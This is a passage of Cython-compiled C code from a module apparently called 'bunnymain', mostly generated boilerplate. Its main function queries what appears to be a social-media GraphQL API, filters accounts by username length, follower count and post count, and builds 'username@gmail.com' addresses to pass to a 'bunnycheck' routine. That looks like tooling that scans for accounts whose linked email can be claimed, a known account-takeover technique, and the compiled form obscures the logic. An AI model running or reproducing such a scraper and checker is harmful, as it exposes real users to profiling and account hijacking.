        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 607, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_variables, __pyx_t_8) < 0) __PYX_ERR(0, 604, __pyx_L5_error)
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_server_timestamps, __pyx_n_u_true) < 0) __PYX_ERR(0, 604, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_doc_id, __pyx_kp_u_7717269488336001) < 0) __PYX_ERR(0, 604, __pyx_L5_error)
        __Pyx_XDECREF_SET(__pyx_v_data, ((PyObject*)__pyx_t_5));
        __pyx_t_5 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_requests); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 611, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_post); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 611, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        
        __pyx_t_5 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 613, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 613, __pyx_L5_error)

        
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 613, __pyx_L5_error)

        
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_tuple__58, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 611, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_response, __pyx_t_4);
        __pyx_t_4 = 0;

        
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_json); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 615, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_8)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
          }
        }
        __pyx_t_4 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 615, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_response_json, __pyx_t_4);
        __pyx_t_4 = 0;

        
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_response_json, __pyx_n_s_get); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 616, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_9 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 616, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_10 = NULL;
        __pyx_t_11 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_8);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_8, function);
            __pyx_t_11 = 1;
          }
        }
        #if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_8)) {
          PyObject *__pyx_temp[3] = {__pyx_t_10, __pyx_n_u_data, __pyx_t_9};
          __pyx_t_5 = __Pyx_PyFunction_FastCall(__pyx_t_8, __pyx_temp+1-__pyx_t_11, 2+__pyx_t_11); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 616, __pyx_L5_error)
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        } else
        #endif
        #if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_8)) {
          PyObject *__pyx_temp[3] = {__pyx_t_10, __pyx_n_u_data, __pyx_t_9};
          __pyx_t_5 = __Pyx_PyCFunction_FastCall(__pyx_t_8, __pyx_temp+1-__pyx_t_11, 2+__pyx_t_11); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 616, __pyx_L5_error)
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        } else
        #endif
        {
          __pyx_t_12 = PyTuple_New(2+__pyx_t_11); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 616, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_12);
          if (__pyx_t_10) {
            __Pyx_GIVEREF(__pyx_t_10); PyTuple_SET_ITEM(__pyx_t_12, 0, __pyx_t_10); __pyx_t_10 = NULL;
          }
          __Pyx_INCREF(__pyx_n_u_data);
          __Pyx_GIVEREF(__pyx_n_u_data);
          PyTuple_SET_ITEM(__pyx_t_12, 0+__pyx_t_11, __pyx_n_u_data);
          __Pyx_GIVEREF(__pyx_t_9);
          PyTuple_SET_ITEM(__pyx_t_12, 1+__pyx_t_11, __pyx_t_9);
          __pyx_t_9 = 0;
          __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_t_12, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 616, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        }
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_get); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 616, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 616, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_12 = NULL;
        __pyx_t_11 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
          __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_8);
          if (likely(__pyx_t_12)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
            __Pyx_INCREF(__pyx_t_12);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_8, function);
            __pyx_t_11 = 1;
          }
        }
        #if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_8)) {
          PyObject *__pyx_temp[3] = {__pyx_t_12, __pyx_n_u_user, __pyx_t_5};
          __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_8, __pyx_temp+1-__pyx_t_11, 2+__pyx_t_11); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 616, __pyx_L5_error)
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        } else
        #endif
        #if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_8)) {
          PyObject *__pyx_temp[3] = {__pyx_t_12, __pyx_n_u_user, __pyx_t_5};
          __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_8, __pyx_temp+1-__pyx_t_11, 2+__pyx_t_11); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 616, __pyx_L5_error)
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        } else
        #endif
        {
          __pyx_t_9 = PyTuple_New(2+__pyx_t_11); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 616, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_9);
          if (__pyx_t_12) {
            __Pyx_GIVEREF(__pyx_t_12); PyTuple_SET_ITEM(__pyx_t_9, 0, __pyx_t_12); __pyx_t_12 = NULL;
          }
          __Pyx_INCREF(__pyx_n_u_user);
          __Pyx_GIVEREF(__pyx_n_u_user);
          PyTuple_SET_ITEM(__pyx_t_9, 0+__pyx_t_11, __pyx_n_u_user);
          __Pyx_GIVEREF(__pyx_t_5);
          PyTuple_SET_ITEM(__pyx_t_9, 1+__pyx_t_11, __pyx_t_5);
          __pyx_t_5 = 0;
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_t_9, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 616, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        }
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF_SET(__pyx_v_user_data, __pyx_t_4);
        __pyx_t_4 = 0;

        
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_user_data, __pyx_n_s_get); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 617, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__59, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 617, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_username, __pyx_t_8);
        __pyx_t_8 = 0;

        
        __pyx_t_14 = __Pyx_PyObject_IsTrue(__pyx_v_username); if (unlikely(__pyx_t_14 < 0)) __PYX_ERR(0, 619, __pyx_L5_error)
        if (__pyx_t_14) {
        } else {
          __pyx_t_13 = __pyx_t_14;
          goto __pyx_L14_bool_binop_done;
        }
        __pyx_t_14 = (__Pyx_PySequence_ContainsTF(__pyx_n_u__60, __pyx_v_username, Py_NE)); if (unlikely(__pyx_t_14 < 0)) __PYX_ERR(0, 619, __pyx_L5_error)
        __pyx_t_15 = (__pyx_t_14 != 0);
        if (__pyx_t_15) {
        } else {
          __pyx_t_13 = __pyx_t_15;
          goto __pyx_L14_bool_binop_done;
        }
        __pyx_t_6 = PyObject_Length(__pyx_v_username); if (unlikely(__pyx_t_6 == ((Py_ssize_t)-1))) __PYX_ERR(0, 619, __pyx_L5_error)
        __pyx_t_15 = ((__pyx_t_6 >= 6) != 0);
        __pyx_t_13 = __pyx_t_15;
        __pyx_L14_bool_binop_done:;
        if (__pyx_t_13) {

          
          __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_user_data, __pyx_n_s_get); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 620, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_8);
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_tuple__61, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 620, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_8 = __Pyx_PyNumber_Int(__pyx_t_4); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 620, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF_SET(__pyx_v_follower_count, __pyx_t_8);
          __pyx_t_8 = 0;

          
          __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_user_data, __pyx_n_s_get); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 621, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_8);
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_tuple__62, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 621, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_8 = __Pyx_PyNumber_Int(__pyx_t_4); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 621, __pyx_L5_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF_SET(__pyx_v_media_count, __pyx_t_8);
          __pyx_t_8 = 0;

          
          __pyx_t_8 = PyObject_RichCompare(__pyx_v_follower_count, __pyx_int_10, Py_GE); __Pyx_XGOTREF(__pyx_t_8); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 622, __pyx_L5_error)
          __pyx_t_15 = __Pyx_PyObject_IsTrue(__pyx_t_8); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 622, __pyx_L5_error)
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          if (__pyx_t_15) {
          } else {
            __pyx_t_13 = __pyx_t_15;
            goto __pyx_L18_bool_binop_done;
          }
          __pyx_t_8 = PyObject_RichCompare(__pyx_v_media_count, __pyx_int_0, Py_GT); __Pyx_XGOTREF(__pyx_t_8); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 622, __pyx_L5_error)
          __pyx_t_15 = __Pyx_PyObject_IsTrue(__pyx_t_8); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 622, __pyx_L5_error)
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_13 = __pyx_t_15;
          __pyx_L18_bool_binop_done:;
          if (__pyx_t_13) {

            
            __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_v_username, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 623, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_4 = __Pyx_PyUnicode_Concat(__pyx_t_8, __pyx_kp_u_gmail_com); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 623, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_XDECREF_SET(__pyx_v_email, ((PyObject*)__pyx_t_4));
            __pyx_t_4 = 0;

            
            __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_bunnycheck); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 624, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_8);
            __pyx_t_9 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
              __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_8);
              if (likely(__pyx_t_9)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
                __Pyx_INCREF(__pyx_t_9);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_8, function);
              }
            }
            __pyx_t_4 = (__pyx_t_9) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_9, __pyx_v_email) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_v_email);
            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 624, __pyx_L5_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

            
          }

          
        }

        
      }
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L12_try_end;
      __pyx_L5_error:;
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

      
      __pyx_t_11 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
      if (__pyx_t_11) {
        __Pyx_AddTraceback("source.bunnymain", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_8, &__pyx_t_9) < 0) __PYX_ERR(0, 625, __pyx_L7_except_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_GOTREF(__pyx_t_9);

        
        goto __pyx_L21_except_continue;
        __pyx_L21_except_continue:;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        goto __pyx_L11_try_continue;
      }
      goto __pyx_L7_except_error;
      __pyx_L7_except_error:;

      
      __Pyx_XGIVEREF(__pyx_t_1);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
      goto __pyx_L1_error;
      __pyx_L11_try_continue:;
      __Pyx_XGIVEREF(__pyx_t_1);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
      goto __pyx_L3_continue;
      __pyx_L12_try_end:;
    }
    __pyx_L3_continue:;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_AddTraceback("source.bunnymain", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_user_id);
  __Pyx_XDECREF(__pyx_v_rnd);
  __Pyx_XDECREF(__pyx_v_user_agent);
  __Pyx_XDECREF(__pyx_v_lsd);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_response_json);
  __Pyx_XDECREF(__pyx_v_user_data);
  __Pyx_XDECREF(__pyx_v_username);
  __Pyx_XDECREF(__pyx_v_follower_count);
  __Pyx_XDECREF(__pyx_v_media_count);
  __Pyx_XDECREF(__pyx_v_email);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static struct __pyx_obj_6source___pyx_scope_struct__genexpr *__pyx_freelist_6source___pyx_scope_struct__genexpr[8];
static int __pyx_freecount_6source___pyx_scope_struct__genexpr = 0;

static PyObject *__pyx_tp_new_6source___pyx_scope_struct__genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  if (CYTHON_COMPILING_IN_CPYTHON && likely((__pyx_freecount_6source___pyx_scope_struct__genexpr > 0) & (t->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct__genexpr)))) {
    o = (PyObject*)__pyx_freelist_6source___pyx_scope_struct__genexpr[--__pyx_freecount_6source___pyx_scope_struct__genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_6source___pyx_scope_struct__genexpr));
    (void) PyObject_INIT(o, t);
    PyObject_GC_Track(o);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  return o;
}

static void __pyx_tp_dealloc_6source___pyx_scope_struct__genexpr(PyObject *o) {
  struct __pyx_obj_6source___pyx_scope_struct__genexpr *p = (struct __pyx_obj_6source___pyx_scope_struct__genexpr *)o;
  PyObject_GC_UnTrack(o);
  Py_CLEAR(p->__pyx_v_i);
  if (CYTHON_COMPILING_IN_CPYTHON && ((__pyx_freecount_6source___pyx_scope_struct__genexpr < 8) & (Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct__genexpr)))) {
    __pyx_freelist_6source___pyx_scope_struct__genexpr[__pyx_freecount_6source___pyx_scope_struct__genexpr++] = ((struct __pyx_obj_6source___pyx_scope_struct__genexpr *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}

static int __pyx_tp_traverse_6source___pyx_scope_struct__genexpr(PyObject *o, visitproc v, void *a) {
  int e;
  struct __pyx_obj_6source___pyx_scope_struct__genexpr *p = (struct __pyx_obj_6source___pyx_scope_struct__genexpr *)o;
  if (p->__pyx_v_i) {
    e = (*v)(p->__pyx_v_i, a); if (e) return e;
  }
  return 0;
}

static PyTypeObject __pyx_type_6source___pyx_scope_struct__genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "source.__pyx_scope_struct__genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_6source___pyx_scope_struct__genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_6source___pyx_scope_struct__genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC, /*tp_flags*/
  0, /*tp_doc*/
  __pyx_tp_traverse_6source___pyx_scope_struct__genexpr, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  0, /*tp_dictoffset*/
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_6source___pyx_scope_struct__genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  0, /*tp_finalize*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
  0, /*tp_print*/
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
  0, /*tp_pypy_flags*/
  #endif
};

static struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *__pyx_freelist_6source___pyx_scope_struct_1_genexpr[8];
static int __pyx_freecount_6source___pyx_scope_struct_1_genexpr = 0;

static PyObject *__pyx_tp_new_6source___pyx_scope_struct_1_genexpr(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  if (CYTHON_COMPILING_IN_CPYTHON && likely((__pyx_freecount_6source___pyx_scope_struct_1_genexpr > 0) & (t->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct_1_genexpr)))) {
    o = (PyObject*)__pyx_freelist_6source___pyx_scope_struct_1_genexpr[--__pyx_freecount_6source___pyx_scope_struct_1_genexpr];
    memset(o, 0, sizeof(struct __pyx_obj_6source___pyx_scope_struct_1_genexpr));
    (void) PyObject_INIT(o, t);
    PyObject_GC_Track(o);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  return o;
}

static void __pyx_tp_dealloc_6source___pyx_scope_struct_1_genexpr(PyObject *o) {
  struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *p = (struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *)o;
  PyObject_GC_UnTrack(o);
  Py_CLEAR(p->__pyx_v_i);
  if (CYTHON_COMPILING_IN_CPYTHON && ((__pyx_freecount_6source___pyx_scope_struct_1_genexpr < 8) & (Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_6source___pyx_scope_struct_1_genexpr)))) {
    __pyx_freelist_6source___pyx_scope_struct_1_genexpr[__pyx_freecount_6source___pyx_scope_struct_1_genexpr++] = ((struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}

static int __pyx_tp_traverse_6source___pyx_scope_struct_1_genexpr(PyObject *o, visitproc v, void *a) {
  int e;
  struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *p = (struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *)o;
  if (p->__pyx_v_i) {
    e = (*v)(p->__pyx_v_i, a); if (e) return e;
  }
  return 0;
}

static PyTypeObject __pyx_type_6source___pyx_scope_struct_1_genexpr = {
  PyVarObject_HEAD_INIT(0, 0)
  "source.__pyx_scope_struct_1_genexpr", /*tp_name*/
  sizeof(struct __pyx_obj_6source___pyx_scope_struct_1_genexpr), /*tp_basicsize*/
  0, /*tp_itemsize*/
  __pyx_tp_dealloc_6source___pyx_scope_struct_1_genexpr, /*tp_dealloc*/
  #if PY_VERSION_HEX < 0x030800b4
  0, /*tp_print*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0, /*tp_vectorcall_offset*/
  #endif
  0, /*tp_getattr*/
  0, /*tp_setattr*/
  #if PY_MAJOR_VERSION < 3
  0, /*tp_compare*/
  #endif
  #if PY_MAJOR_VERSION >= 3
  0, /*tp_as_async*/
  #endif
  0, /*tp_repr*/
  0, /*tp_as_number*/
  0, /*tp_as_sequence*/
  0, /*tp_as_mapping*/
  0, /*tp_hash*/
  0, /*tp_call*/
  0, /*tp_str*/
  0, /*tp_getattro*/
  0, /*tp_setattro*/
  0, /*tp_as_buffer*/
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC, /*tp_flags*/
  0, /*tp_doc*/
  __pyx_tp_traverse_6source___pyx_scope_struct_1_genexpr, /*tp_traverse*/
  0, /*tp_clear*/
  0, /*tp_richcompare*/
  0, /*tp_weaklistoffset*/
  0, /*tp_iter*/
  0, /*tp_iternext*/
  0, /*tp_methods*/
  0, /*tp_members*/
  0, /*tp_getset*/
  0, /*tp_base*/
  0, /*tp_dict*/
  0, /*tp_descr_get*/
  0, /*tp_descr_set*/
  0, /*tp_dictoffset*/
  0, /*tp_init*/
  0, /*tp_alloc*/
  __pyx_tp_new_6source___pyx_scope_struct_1_genexpr, /*tp_new*/
  0, /*tp_free*/
  0, /*tp_is_gc*/
  0, /*tp_bases*/
  0, /*tp_mro*/
  0, /*tp_cache*/
  0, /*tp_subclasses*/
  0, /*tp_weaklist*/
  0, /*tp_del*/
  0, /*tp_version_tag*/
  #if PY_VERSION_HEX >= 0x030400a1
  0, /*tp_finalize*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0, /*tp_vectorcall*/
  #endif
  #if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
  0, /*tp_print*/
  #endif
